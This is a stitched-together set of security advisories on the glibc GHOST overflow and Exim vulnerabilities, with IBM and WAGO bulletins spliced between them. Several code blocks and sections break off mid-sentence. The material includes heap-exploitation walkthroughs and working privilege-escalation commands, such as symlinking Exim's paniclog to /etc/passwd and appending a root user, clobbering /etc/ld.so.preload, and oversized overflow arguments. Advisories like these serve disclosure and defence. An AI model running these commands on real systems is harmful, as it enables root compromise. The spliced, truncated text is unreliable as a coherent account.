if and only if inet_aton() fails first. This time, however, there is
another function call in between (Fedora, for example, does define
USE_IDN):

--------[ 4.4.2.1 - ping ]----------------------------------------------------

                if (inet_aton(target, &whereto.sin_addr) == 1) {
                        ...
                } else {
                        char *idn;
#ifdef USE_IDN
                        int rc;
                        ...
                        rc = idna_to_ascii_lz(target, &idn, 0);
                        if (rc != IDNA_SUCCESS) {
                                fprintf(stderr, "ping: IDN encoding failed: %s\n", idna_strerror(rc));
                                exit(2);
                        }
#else
                        idn = target;
#endif
                        hp = gethostbyname(idn);

--------[ 4.4.2.2 - arping ]--------------------------------------------------

        if (inet_aton(target, &dst) != 1) {
                struct hostent *hp;
                char *idn = target;
#ifdef USE_IDN
                int rc;

                rc = idna_to_ascii_lz(target, &idn, 0);

                if (rc != IDNA_SUCCESS) {
                        fprintf(stderr, "arping: IDN encoding failed: %s\n", idna_strerror(rc));
                        exit(2);
                }
#endif

                hp = gethostbyname2(idn, AF_INET);

--------[ 4.4.2.3 - Analysis ]------------------------------------------------

If idna_to_ascii_lz() modifies the target hostname, the first call to
inet_aton() could fail and the second call (internal to gethostbyname())
could succeed. For example, idna_to_ascii_lz() transforms any Unicode
dot-like character (0x3002, 0xFF0E, 0xFF61) into an ASCII dot (".").

But it also restricts the length of a domain label to 63 characters:
this makes it impossible to reach 1024 bytes (the "1-KB" requirement)
with only 4 labels and 3 dots (the "inet-aton" requirement).

Unless inet_aton() (actually, strtoul()) can be tricked into accepting
more than 3 dots? Indeed, idna_to_ascii_lz() does not restrict the total
length of a domain name. glibc supports "thousands' grouping characters"
(man 3 printf); for example, sscanf(str, "%'lu", &ul) yields 1000 when
processing any of the following input strings:

- "1,000" in an English locale;
- "1 000" in a French locale; and
- "1.000" in a German or Spanish locale.

strtoul() implements this "number grouping" too, but its use is limited
to internal glibc functions. Conclusion: more than 3 dots is impossible,
and neither ping nor arping is vulnerable.

----[ 4.5 - procmail ]--------------------------------------------------------

procmail (a SUID-root and SGID-mail binary) is vulnerable through its
"comsat/biff" feature:

#define COMSAThost      "localhost"    /* where the biff/comsat daemon lives */
...
#define SERV_ADDRsep    '@'           /* when overriding in COMSAT=serv@addr */

int setcomsat(chp)const char*chp;
{ char*chad; ...
  chad=strchr(chp,SERV_ADDRsep);                             /* @ separator? */
  ...
  if(chad)
     *chad++='\0';                                    /* split the specifier */
  if(!chad||!*chad)                                               /* no host */
#ifndef IP_localhost                          /* Is "localhost" preresolved? */
     chad=COMSAThost;                                   /* nope, use default */
#else /* IP_localhost */
   { ...

----[ 4.6 - pppd ]------------------------------------------------------------

pppd (yet another SUID-root binary) calls gethostbyname() if a
preliminary call to inet_addr() (a simple wrapper around inet_aton())
fails. "The inet_addr() function converts the Internet host address cp
from IPv4 numbers-and-dots notation into binary data in network byte
order. If the input is invalid, INADDR_NONE (usually -1) is returned.
Use of this function is problematic because -1 is a valid address
(255.255.255.255)." A failure for inet_addr(), but a success for
inet_aton(), and consequently a path to the buffer overflow.

--[ 5 - Exploitation ]--------------------------------------------------------

----[ 5.1 - Code execution ]--------------------------------------------------

In this section, we describe how we achieve remote code execution
against the Exim SMTP mail server, bypassing the NX (No-eXecute)
protection and glibc's malloc hardening.

First, we overflow gethostbyname's heap-based buffer and partially
overwrite the size field of the next contiguous free chunk of memory
with a slightly larger size (we overwrite only 3 bytes of the size
field; in any case, we cannot overflow more than 4 bytes on 32-bit
machines, or 8 bytes on 64-bit machines):

                            |< malloc_chunk
                            |
-----|----------------------|---+--------------------|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| free chunk | ...
-----|----------------------|---+--------------------|-----
     |                         X|
     |------------------------->|
               overflow

where:

struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

and: X marks the spot where the crucial memory corruption takes place.

As a result, this artificially-enlarged free chunk, which is managed by
glibc's malloc, overlaps another block of memory, Exim's current_block,
which is managed by Exim's internal memory allocator:

                            |< malloc_chunk          |< storeblock
                            |                        |
-----|----------------------|------------------------|---------------+---|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| free chunk |n|l| current_block | ...
-----|----------------------|------------------------|---------------+---|-----
                            |                                        |
                            |<-------------------------------------->|
                                 artificially enlarged free chunk

where:

typedef struct storeblock {
  struct storeblock *next;
  size_t length;
} storeblock;

Then, we partially allocate the enlarged free chunk and overwrite the
beginning of Exim's current_block of memory (the "storeblock" structure)
with arbitrary data. In particular, we overwrite its "next" field:

                            |< malloc_chunk          |< storeblock
                            |                        |
-----|----------------------|------------------------|--------+----------|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaaaaa |n|l| current_block | ...
-----|----------------------|------------------------|--------+----------|-----
                            |                         X       |
                            |<------------------------------->|
                                      allocated chunk

This effectively turns gethostbyname's buffer overflow into a
write-anything-anywhere primitive, because we control both the pointer
to the next block of memory returned by Exim's allocator (the hijacked
"next" pointer) and the data allocated (a null-terminated string, the
argument of an SMTP command we send to Exim).

Finally, we use this write-anything-anywhere primitive to overwrite
Exim's run-time configuration, which is cached in the heap memory. More
precisely, we overwrite Exim's Access Control Lists (ACLs), and achieve
arbitrary command execution thanks to Exim's "${run{<command> <args>}}"
string expansion mechanism:

                                                     |< storeblock
                                                     |

          |<------------------->|
             new current_block

----[ 5.2 - Information leak ]------------------------------------------------

The success of this exploit depends on an important piece of
information: the address of Exim's run-time configuration in the heap.
In this section, we describe how we obtain this address, bypassing the
ASLR (Address Space Layout Randomization) and PIE (Position Independent
Executable) protections.

First, we overflow gethostbyname's heap-based buffer and partially
overwrite the size field of the next contiguous free chunk of memory
with a slightly larger size:

                            |< malloc_chunk
                            |

As a result, this artificially-enlarged free chunk overlaps another
block of memory, where Exim saves the error message "503 sender not yet
given\r\n" for later use:

                            |< malloc_chunk
                            |
-----|----------------------|-----------------------------|----------+----|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| real free chunk | error message | ...
-----|----------------------|-----------------------------|----------+----|-----
                            |                                        |
                            |<-------------------------------------->|
                                 artificially enlarged free chunk

Then, we partially allocate the artificially-enlarged free chunk,
thereby splitting it in two: the newly allocated chunk, and a smaller,
free chunk (the remainder from the split). The malloc_chunk header for
this remaining free chunk overwrites the very beginning of the saved
error message with a pointer to the heap (the fd_nextsize pointer):

                            |< malloc_chunk       |< malloc_chunk
                            |                     |
-----|----------------------|---------------------+-------|----------+----|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaa |p|s|f|b|F|B| r message | ...
-----|----------------------|---------------------+-------|----------+----|-----
                            |                     |        X         |
                            |<------------------->|<---------------->|
                                allocated chunk        free chunk

Finally, we send an invalid SMTP command to Exim, and retrieve the
fd_nextsize heap pointer from Exim's SMTP response, which includes the
corrupted error message. This effectively turns gethostbyname's buffer
overflow into an information leak; moreover, it allows us to distinguish
between 32-bit and 64-bit machines.

# Security Bulletin: GNU C library (glibc) vulnerability affects IBM PureApplication System (CVE-2015-0235)

### Security Bulletin

## Summary

GNU C library (glibc) vulnerability that has been referred to as GHOST affects IBM PureApplication System.

## Vulnerability Details

**CVEID:** [CVE-2015-0235](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235)

## Affected Products and Versions

· IBM PureApplication System V1.0

· IBM PureApplication System V1.1

· IBM PureApplication System V2.0

## Remediation/Fixes

The deployed Red Hat Linux-based virtual machines on all IBM PureApplication Systems types are affected. The solution is to apply the following IBM PureApplication System emergency fix to the deployed virtual machines.

[*http://www-933.ibm.com/support/fixcentral/swg/selectFixes?parent=PureSystems&product=ibm/WebSphere/PureApplication+System&release=All&platform=All&function=fixId&fixids=HV\_RHEL6\_X64\_GLIBC\_PA\_EFIX&includeSupersedes=0*](http://www-933.ibm.com/support/fixcentral/swg/selectFixes?parent=PureSystems&product=ibm/WebSphere/PureApplication+System&release=All&platform=All&function=fixId&fixids=HV_RHEL6_X64_GLIBC_PA_EFIX&includeSupersedes=0)

1. Import the fix into the Emergency Fix catalogue.

2. For deployed instances, apply this emergency fix on the VM. The glibc will be upgraded to 2.12-1.149.el6\_6.5.

This emergency fix can be applied to:

* IBM OS Image for Red Hat Linux System 2.0
* IBM OS Image for Red Hat Linux Systems 2.0.0.1
* IBM OS Image for Red Hat Linux Systems 2.0.0.2
* IBM OS Image for Red Hat Linux Systems 2.0.0.3
* IBM OS Image for Red Hat Linux Systems 2.0.0.4
* IBM OS Image for Red Hat Linux Systems 2.1.0.0
* IBM OS Image for Red Hat Linux Systems 2.1.0.1

After updates have been applied, you must restart any process using glibc. Given that nearly all system processes use glibc, rebooting after upgrading is suggested.

IBM recommends that you review your entire environment to identify vulnerable releases of glibc including your Operating Systems and take appropriate mitigation and remediation actions. Please contact your Operating System provider for more information.

Source: <http://www.wago.us/wago/>

Business recommendation:
------------------------
SEC Consult recommends to immediately apply the available patches
from the vendor. A thorough security review should be performed by
security professionals to identify further potential security issues.

Vulnerability overview/description:
-----------------------------------
The industrial managed switch series 852 from WAGO is affected by multiple
vulnerabilities such as old software components embedded in the firmware.
Furthermore, hardcoded password hashes and credentials were also found by doing
an automated scan with IoT Inspector. Two vulnerabilities (CVE-2017-16544 and
CVE-2015-0235) were verified by emulating the device with the MEDUSA scaleable
firmware runtime. The validity of the password hashes and the embedded keys were
also verified by emulating the device.

1) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.12.0 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scaleable firmware runtime.

2) Known GNU glibc Vulnerabilities
The used GNU glibc in version 2.8 is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of
the discovered vulnerabilities (CVE-2015-0235, "GHOST") was verified by
using the MEDUSA scaleable firmware runtime.

3) Hardcoded Credentials (CVE-2019-12550)
The device contains hardcoded users and passwords which can be used to login
via SSH and Telnet.

4) Embedded Private Keys (CVE-2019-12549)
The device contains hardcoded private keys for the SSH daemon. The fingerprint
of the SSH host key from the corresponding SSH daemon matches to the embedded
private key.

Proof of concept:
-----------------
1) Known BusyBox Vulnerabilities
BusyBox version 1.12.0 contains multiple CVEs like:
CVE-2013-1813, CVE-2016-2148, CVE-2016-6301, CVE-2011-2716, CVE-2011-5325,
CVE-2015-9261, CVE-2016-2147 and more.

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device. A file with the name "\ectest\n\e]55;test.txt\a" was created
to trigger the vulnerability.

-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Known GNU glibc Vulnerabilities
GNU glibc version 2.8 contains multiple CVEs like:
CVE-2010-0296, CVE-2010-3856, CVE-2012-4412, CVE-2014-4043, CVE-2014-9402,
CVE-2014-9761, CVE-2014-9984, CVE-2015-1472 and more.

The gethostbyname buffer overflow vulnerability (GHOST) was checked with the help
of the exploit code from <https://seclists.org/oss-sec/2015/q1/274>. It was compiled
and executed on the emulated device to test the system.

3) Hardcoded Credentials (CVE-2019-12550)
The following credentials were found in the 'passwd' file of the firmware:
<Password Hash>                                 <Plaintext>         <User>
<removed>                                       <removed>            root
No password is set for the account              [EMPTY PASSWORD]     admin

By using these credentials, it's possible to connect via Telnet and SSH on the
emulated device. Example for Telnet:
-------------------------------------------------------------------------------
[root@localhost ~]# telnet 192.168.0.133
Trying 192.168.0.133...
Connected to 192.168.0.133.
Escape character is '^]'.

L2SWITCH login: root
Password:
~ #
-------------------------------------------------------------------------------
Example for SSH:
-------------------------------------------------------------------------------
[root@localhost ~]# ssh 192.168.0.133
root@192.168.0.133's password:
~ #
-------------------------------------------------------------------------------

4) Embedded Private Keys (CVE-2019-12549)
The following host key fingerprint is shown by accessing the SSH daemon on
the emulated device:

[root@localhost ~]# ssh 192.168.0.133
The authenticity of host '192.168.0.133 (192.168.0.133)' can't be established.
RSA key fingerprint is SHA256:X5Vr0/x0/j62N/aqZmHz96ojwl8x/I8mfzuT8o6uZso.
RSA key fingerprint is MD5:2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2.

This matches the embedded private key (which has been removed from this advisory):
SSH Fingerprint: 2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2

Vulnerable / tested versions:

========================================================================
Summary
========================================================================

We recently audited central parts of the Exim mail server
(<https://en.wikipedia.org/wiki/Exim>) and discovered 21 vulnerabilities
(from CVE-2020-28007 to CVE-2020-28026, plus CVE-2021-27216): 11 local
vulnerabilities, and 10 remote vulnerabilities. Unless otherwise noted,
all versions of Exim are affected since at least the beginning of its
Git history, in 2004.

We have not tried to exploit all of these vulnerabilities, but we
successfully exploited 4 LPEs (Local Privilege Escalations) and 3 RCEs
(Remote Code Executions):

- CVE-2020-28007 (LPE, from user "exim" to root);

- CVE-2020-28008 (LPE, from user "exim" to root);

- CVE-2020-28015 (LPE, from any user to root);

- CVE-2020-28012 (LPE, from any user to root, if allow_filter is true);

- CVE-2020-28020 (unauthenticated RCE as "exim", in Exim < 4.92);

- CVE-2020-28018 (unauthenticated RCE as "exim", in 4.90 <= Exim < 4.94,
  if TLS encryption is provided by OpenSSL);

- CVE-2020-28021 (authenticated RCE, as root);

- CVE-2020-28017 is also exploitable (unauthenticated RCE as "exim"),
  but requires more than 25GB of memory in the default configuration.

We will not publish our exploits for now; instead, we encourage other
security researchers to write and publish their own exploits:

- This advisory contains sufficient information to develop reliable
  exploits for these vulnerabilities; in fact, we believe that better
  exploitation methods exist.

- We hope that more security researchers will look into Exim's code and
  report their findings; indeed, we discovered several of these
  vulnerabilities while working on our exploits.

- We will answer (to the best of our abilities) any questions regarding
  these vulnerabilities and exploits on the public "oss-security" list
  (<https://oss-security.openwall.org/wiki/mailing-lists/oss-security>).

Last-minute note: as explained in the Timeline, we developed a minimal
set of patches for these vulnerabilities; for reference and comparison,
it is attached to this advisory and is also available at
<https://www.qualys.com/research/security-advisories/>.

========================================================================
CVE-2020-28007: Link attack in Exim's log directory
========================================================================

The Exim binary is set-user-ID-root, and Exim operates as root in its
log directory, which belongs to the "exim" user:

------------------------------------------------------------------------
drwxr-s--- 2 Debian-exim adm         4096 Nov  4 06:16 /var/log/exim4
------------------------------------------------------------------------

An attacker who obtained the privileges of the "exim" user (by
exploiting CVE-2020-28020 or CVE-2020-28018 for example) can exploit
this local vulnerability to obtain full root privileges. Indeed, the
following code opens a log file in append mode, as root (lines 465-469):

------------------------------------------------------------------------
  22 static uschar *log_names[] = { US"main", US"reject", US"panic", US"debug" };
 ...
 382 static void
 383 open_log(int *fd, int type, uschar *tag)
 384 {
 ...
 387 uschar buffer[LOG_NAME_SIZE];
 ...
 398 ok = string_format(buffer, sizeof(buffer), CS file_path, log_names[type]);
 ...
 465 *fd = Uopen(buffer,
 466 #ifdef O_CLOEXEC
 467                 O_CLOEXEC |
 468 #endif
 469                 O_APPEND|O_WRONLY, LOG_MODE);
------------------------------------------------------------------------

The name of the log file in buffer is derived from file_path, which is
derived from log_file_path, a format string defined at compile time (or
re-defined by the configuration file). On Debian, log_file_path is
"/var/log/exim4/%slog", and "%s" is converted to "main", "reject",
"panic", or "debug" at run time (line 398).

An attacker with the privileges of the "exim" user can create a symlink
(or a hardlink) in the log directory, append arbitrary contents to an
arbitrary file (to /etc/passwd, for example), and obtain full root
privileges:

------------------------------------------------------------------------
id
uid=107(Debian-exim) gid=114(Debian-exim) groups=114(Debian-exim)

cd /var/log/exim4
ln -s -f /etc/passwd paniclog

/usr/sbin/exim4 -Rr $'X\n_trinity:SCB2INhNOLCrc:0:0::/:\nX['

Password: Z1ON0101

id
uid=0(root) gid=0(root) groups=0(root)
------------------------------------------------------------------------

========================================================================
CVE-2020-28008: Assorted attacks in Exim's spool directory
========================================================================

Exim also operates as root in its spool directory, which belongs to the
"exim" user:

------------------------------------------------------------------------
drwxr-x--- 5 Debian-exim Debian-exim 4096 Nov  4 06:16 /var/spool/exim4
drwxr-x--- 2 Debian-exim Debian-exim 4096 Nov  4 06:16 /var/spool/exim4/db
drwxr-x--- 2 Debian-exim Debian-exim 4096 Nov  4 06:16 /var/spool/exim4/input
drwxr-x--- 2 Debian-exim Debian-exim 4096 Nov  4 06:16 /var/spool/exim4/msglog
------------------------------------------------------------------------

An attacker who obtained the privileges of the "exim" user can exploit
this local vulnerability to obtain full root privileges. Various attack
vectors exist:

- The attacker can directly write to a spool header file (in the "input"
  subdirectory) and reuse our exploitation technique for CVE-2020-28015.

- The attacker can create a long-named file in the "db" subdirectory and
  overflow a stack-based buffer (at line 208):

------------------------------------------------------------------------
 87 open_db *
 88 dbfn_open(uschar *name, int flags, open_db *dbblock, BOOL lof)
 89 {
 ..
 94 uschar dirname[256], filename[256];
...
111 snprintf(CS dirname, sizeof(dirname), "%s/db", spool_directory);
112 snprintf(CS filename, sizeof(filename), "%s/%s.lockfile", dirname, name);
...
198   uschar *lastname = Ustrrchr(filename, '/') + 1;
199   int namelen = Ustrlen(name);
200
201   *lastname = 0;
202   dd = opendir(CS filename);
203
204   while ((ent = readdir(dd)))
205     if (Ustrncmp(ent->d_name, name, namelen) == 0)
206       {
207       struct stat statbuf;
208       Ustrcpy(lastname, ent->d_name);
------------------------------------------------------------------------

  Proof of concept:

------------------------------------------------------------------------
id
uid=107(Debian-exim) gid=114(Debian-exim) groups=114(Debian-exim)

cd /var/spool/exim4/db

------------------------------------------------------------------------

- The attacker can create a symlink (or a hardlink) in the "db"
  subdirectory and take ownership of an arbitrary file (at line 212):

------------------------------------------------------------------------
204   while ((ent = readdir(dd)))
205     if (Ustrncmp(ent->d_name, name, namelen) == 0)
206       {
207       struct stat statbuf;
208       Ustrcpy(lastname, ent->d_name);
209       if (Ustat(filename, &statbuf) >= 0 && statbuf.st_uid != exim_uid)
210         {
211         DEBUG(D_hints_lookup) debug_printf_indent("ensuring %s is owned by exim\n", filename);
212         if (Uchown(filename, exim_uid, exim_gid))
------------------------------------------------------------------------

  Exploitation:

Side note: CVE-2020-28007 and CVE-2020-28008 are very similar to
<https://www.halfdog.net/Security/2016/DebianEximSpoolLocalRoot/>.

========================================================================
CVE-2020-28014: Arbitrary file creation and clobbering
========================================================================

An attacker who obtained the privileges of the "exim" user can abuse the
-oP override_pid_file_path option to create (or overwrite) an arbitrary
file, as root. The attacker does not, however, control the contents of
this file:

------------------------------------------------------------------------
id
uid=107(Debian-exim) gid=114(Debian-exim) groups=114(Debian-exim)

/usr/sbin/exim4 -bdf -oX 0 -oP /etc/ld.so.preload &
[1] 3371

sleep 3

kill -9 "$!"
[1]+  Killed                  /usr/sbin/exim4 -bdf -oX 0 -oP /etc/ld.so.preload

ls -l /etc/ld.so.preload
ERROR: ld.so: object '3371' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
-rw-r--r-- 1 root Debian-exim 5 Nov  4 20:20 /etc/ld.so.preload
------------------------------------------------------------------------

The attacker can also combine this vulnerability with CVE-2020-28007 or
CVE-2020-28008 to create an arbitrary file with arbitrary contents and
obtain full root privileges.

========================================================================
CVE-2021-27216: Arbitrary file deletion
========================================================================

While working on a patch for CVE-2020-28014, we discovered another
related vulnerability: any local user can delete any arbitrary file as
root (for example, /etc/passwd), by abusing the -oP and -oPX options in
delete_pid_file():

------------------------------------------------------------------------
 932 void
 933 delete_pid_file(void)
 934 {
 935 uschar * daemon_pid = string_sprintf("%d\n", (int)getppid());
 ...
 939 if ((f = Ufopen(pid_file_path, "rb")))
 940   {
 941   if (  fgets(CS big_buffer, big_buffer_size, f)
 942         && Ustrcmp(daemon_pid, big_buffer) == 0
 943      )
 944     if (Uunlink(pid_file_path) == 0)
------------------------------------------------------------------------

To exploit this vulnerability, a local attacker must win an easy race
condition between the fopen() at line 939 and the unlink() at line 944;
this is left as an exercise for the interested reader.

------------------------------------------------------------------------
History
------------------------------------------------------------------------

This vulnerability was introduced in Exim 4.94:

------------------------------------------------------------------------
commit 01446a56c76aa5ac3213a86f8992a2371a8301f3
Date:   Sat Nov 9 16:04:14 2019 +0000

------------------------------------------------------------------------

========================================================================
CVE-2020-28011: Heap buffer overflow in queue_run()
========================================================================

Through the -R deliver_selectstring and -S deliver_selectstring_sender
options, the "exim" user can overflow the heap-based big_buffer in
queue_run() (lines 419 and 423):

------------------------------------------------------------------------
 412   p = big_buffer;
 ...
 418   if (deliver_selectstring)
 419     p += sprintf(CS p, " -R%s %s", f.deliver_selectstring_regex? "r" : "",
 420       deliver_selectstring);
 421
 422   if (deliver_selectstring_sender)
 423     p += sprintf(CS p, " -S%s %s", f.deliver_selectstring_sender_regex? "r" : "",
 424       deliver_selectstring_sender);
------------------------------------------------------------------------

We have not tried to exploit this vulnerability; if exploitable, it
would allow an attacker who obtained the privileges of the "exim" user
to obtain full root privileges.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------

id
uid=107(Debian-exim) gid=114(Debian-exim) groups=114(Debian-exim)

/usr/sbin/exim4 -R `perl -e 'print "A" x 128000'`
malloc(): invalid size (unsorted)
Aborted

/usr/sbin/exim4 -S `perl -e 'print "A" x 128000'`
malloc(): invalid size (unsorted)
Aborted

========================================================================
CVE-2020-28010: Heap out-of-bounds write in main()
========================================================================

For debugging and logging purposes, Exim copies the current working
directory (initial_cwd) into the heap-based big_buffer:

------------------------------------------------------------------------
3665 initial_cwd = os_getcwd(NULL, 0);
....
3945   uschar *p = big_buffer;
3946   Ustrcpy(p, "cwd= (failed)");
....
3952     Ustrncpy(p + 4, initial_cwd, big_buffer_size-5);
3953     p += 4 + Ustrlen(initial_cwd);
....
3956     *p = '\0';
------------------------------------------------------------------------

The strncpy() at line 3952 cannot overflow big_buffer, but (on Linux at
least) initial_cwd can be much longer than big_buffer_size (16KB): line
3953 can increase p past big_buffer's end, and line 3956 (and beyond)
can write out of big_buffer's bounds.

We have not tried to exploit this vulnerability; if exploitable, it
would allow an unprivileged local attacker to obtain full root
privileges.

-  while (*p) p++;
------------------------------------------------------------------------

========================================================================
CVE-2020-28013: Heap buffer overflow in parse_fix_phrase()
========================================================================

If a local attacker executes Exim with a -F '.(' option (for example),
then parse_fix_phrase() calls strncpy() with a -1 size (which overflows
the destination buffer, because strncpy(dest, src, n) "writes additional
null bytes to dest to ensure that a total of n bytes are written").

Indeed, at line 1124 s and ss are both equal to end, at line 1125 ss is
decremented, and at line 1127 ss-s is equal to -1:

------------------------------------------------------------------------
1124             {
1125             if (ss >= end) ss--;
1126             *t++ = '(';

CVE-2020-28016: Heap out-of-bounds write in parse_fix_phrase()
========================================================================

If a local attacker executes Exim with an empty originator_name (-F ''),
then parse_fix_phrase() allocates a zero-sized buffer (at line 982), but
writes a null byte to buffer[1] (lines 986 and 1149):

------------------------------------------------------------------------
4772 originator_name = parse_fix_phrase(originator_name, Ustrlen(originator_name));
------------------------------------------------------------------------
 960 const uschar *
 961 parse_fix_phrase(const uschar *phrase, int len)
 962 {
 ...
 982 buffer = store_get(len*4, is_tainted(phrase));
 983
 984 s = phrase;
 985 end = s + len;
 986 yield = t = buffer + 1;
 987
 988 while (s < end)
 989   {
....
1147   }
1148
1149 *t = 0;

We have not tried to exploit this vulnerability; if exploitable, it
would allow an unprivileged local attacker to obtain full root

+JH/18 Bug 2617: Fix a taint trap in parse_fix_phrase().  Previously when the
+      name being quoted was tainted a trap would be taken.  Fix by using
+      dynamicaly created buffers.  The routine could have been called by a

CVE-2020-28015: New-line injection into spool header file (local)
========================================================================

When Exim receives a mail, it creates two files in the "input"
subdirectory of its spool directory: a "data" file, which contains the
body of the mail, and a "header" file, which contains the headers of the
mail and important metadata (the sender and the recipient addresses, for
example). Such a header file consists of lines of text separated by '\n'
characters.

Unfortunately, an unprivileged local attacker can send a mail to a
recipient whose address contains '\n' characters, and can therefore
inject new lines into the spool header file and change Exim's behavior:

------------------------------------------------------------------------

uid=1001(jane) gid=1001(jane) groups=1001(jane)

2020-11-05 09:11:46 1kafzO-0001ho-Tf Format error in spool file 1kafzO-0001ho-Tf-H: size=607
------------------------------------------------------------------------

The effect of this vulnerability is similar to CVE-2020-8794 in
OpenSMTPD, but in Exim's case it is not enough to execute arbitrary
commands. To understand how we transformed this vulnerability into an
arbitrary command execution, we must digress briefly.

------------------------------------------------------------------------
Digression
------------------------------------------------------------------------

Most of the vulnerabilities in this advisory are memory corruptions, and
despite modern protections such as ASLR, NX, and malloc hardening,
memory corruptions in Exim are easy to exploit:

1/ Exim's memory allocator (store.c, which calls malloc() and free()
internally) unintentionally provides attackers with powerful exploit
primitives. In particular, if an attacker can pass a negative size to
the allocator (through an integer overflow or direct control), then:

------------------------------------------------------------------------
119 static void *next_yield[NPOOLS];
120 static int yield_length[NPOOLS] = { -1, -1, -1,  -1, -1, -1 };
...
231 void *
232 store_get_3(int size, BOOL tainted, const char *func, int linenumber)
233 {
...
248 if (size > yield_length[pool])
249   {
...
294   }
...
299 store_last_get[pool] = next_yield[pool];
...
316 next_yield[pool] = (void *)(CS next_yield[pool] + size);
317 yield_length[pool] -= size;
318 return store_last_get[pool];
319 }
------------------------------------------------------------------------

1a/ At line 248, store_get() believes that the current block of memory
is large enough (because size is negative), and goes to line 299. As a
result, store_get()'s caller can overflow the current block of memory (a
"forward-overflow").

1b/ At line 317, the free size of the current block of memory
(yield_length) is mistakenly increased (because size is negative), and
at line 316, the next pointer returned by store_get() (next_yield) is
mistakenly decreased (because size is negative). As a result, the next
memory allocation can overwrite the beginning of Exim's heap: a relative
write-what-where, which naturally bypasses ASLR (a "backward-jump", or
"back-jump").

2/ The beginning of the heap contains Exim's configuration, which
includes various strings that are passed to expand_string() at run time.
Consequently, an attacker who can "back-jump" can overwrite these
strings with "${run{...}}" and execute arbitrary commands (thus
bypassing NX).

The first recorded use of expand_string() in an Exim exploit is
CVE-2010-4344 (and CVE-2010-4345), an important part of Internet
folklore:

<https://www.openwall.com/lists/oss-security/2010/12/10/1>

Note: Exim 4.94 (the latest version) introduces "tainted" memory (i.e.,
untrusted, possibly attacker-controlled data) and refuses to process it
in expand_string(). This mechanism protects Exim against unintentional
expansion of tainted data (CVE-2014-2957 and CVE-2019-10149), but NOT
against memory corruption: an attacker can simply overwrite untainted
memory with tainted data, and still execute arbitrary commands in
expand_string(). For example, we exploited CVE-2020-28015,
CVE-2020-28012, and CVE-2020-28021 in Exim 4.94.

------------------------------------------------------------------------
Exploitation
------------------------------------------------------------------------

CVE-2020-28015 allows us to inject new lines into a spool header file.
To transform this vulnerability into an arbitrary command execution (as
root, since deliver_drop_privilege is false by default), we exploit the
following code in spool_read_header():

------------------------------------------------------------------------
 341 int n;
 ...
 910 while ((n = fgetc(fp)) != EOF)
 911   {
 ...
 914   int i;
 915
 916   if (!isdigit(n)) goto SPOOL_FORMAT_ERROR;
 917   if(ungetc(n, fp) == EOF  ||  fscanf(fp, "%d%c ", &n, flag) == EOF)
 918     goto SPOOL_READ_ERROR;
 ...
 927     h->text = store_get(n+1, TRUE);     /* tainted */
 ...
 935     for (i = 0; i < n; i++)
 936       {
 937       int c = fgetc(fp);
 ...
 940       h->text[i] = c;
 941       }
 942     h->text[i] = 0;
------------------------------------------------------------------------

- at line 917, we start a fake header with a negative length n;

- at line 927, we back-jump to the beginning of the heap (Digression
  1b), because n is negative;

- at line 935, we avoid the forward-overflow (Digression 1a), because n
  is negative;

- then, our next fake header is allocated to the beginning of the heap
  and overwrites Exim's configuration strings (with "${run{command}}");

- last, our arbitrary command is executed when deliver_message()
  processes our fake (injected) recipient and expands the overwritten
  configuration strings (Digression 2).

We can also transform CVE-2020-28015 into an information disclosure, by
exploiting the following code in spool_read_header():

------------------------------------------------------------------------
 756 for (recipients_count = 0; recipients_count < rcount; recipients_count++)
 757   {
 ...
 765   if (Ufgets(big_buffer, big_buffer_size, fp) == NULL) goto SPOOL_READ_ERROR;
 766   nn = Ustrlen(big_buffer);
 767   if (nn < 2) goto SPOOL_FORMAT_ERROR;
 ...
 772   p = big_buffer + nn - 1;
 773   *p-- = 0;
 ...
 809   while (isdigit(*p)) p--;
 ...
 840   else if (*p == '#')
 841     {
 842     int flags;
 ...
 848     (void)sscanf(CS p+1, "%d", &flags);
 849
 850     if ((flags & 0x01) != 0)      /* one_time data exists */
 851       {
 852       int len;
 853       while (isdigit(*(--p)) || *p == ',' || *p == '-');
 854       (void)sscanf(CS p+1, "%d,%d", &len, &pno);
 855       *p = 0;
 856       if (len > 0)
 857         {
 858         p -= len;
 859         errors_to = string_copy_taint(p, TRUE);
 860         }
 861       }
 862
 863     *(--p) = 0;   /* Terminate address */
------------------------------------------------------------------------

For example, if we send a mail to the recipient
'"X@...alhost\njane@...alhost 8192,-1#1\n\n1024* "' (where jane is our
username, and localhost is one of Exim's local_domains), then:

- at line 848, we set flags to 1;

- at line 854, we set len to 8KB;

- at line 858, we decrease p (by 8KB) toward the beginning of the heap;

- at line 859, we read the errors_to string out of big_buffer's bounds;

- finally, we receive our mail, which includes the out-of-bounds
  errors_to string in its "From" and "Return-path:" headers (in this
  example, errors_to contains a fragment of /etc/passwd):

------------------------------------------------------------------------
id
uid=1001(jane) gid=1001(jane) groups=1001(jane)

printf 'Message-Id: X\n';

========================================================================
CVE-2020-28012: Missing close-on-exec flag for privileged pipe
========================================================================

Exim supports a special kind of .forward file called "exim filter" (if
allow_filter is true, the default on Debian). To handle such a filter,
the privileged Exim process creates an unprivileged process and a pipe
for communication. The filter process can fork() and execute arbitrary
commands with expand_string(); this is not a security issue in itself,
because the filter process is unprivileged. Unfortunately, the writable
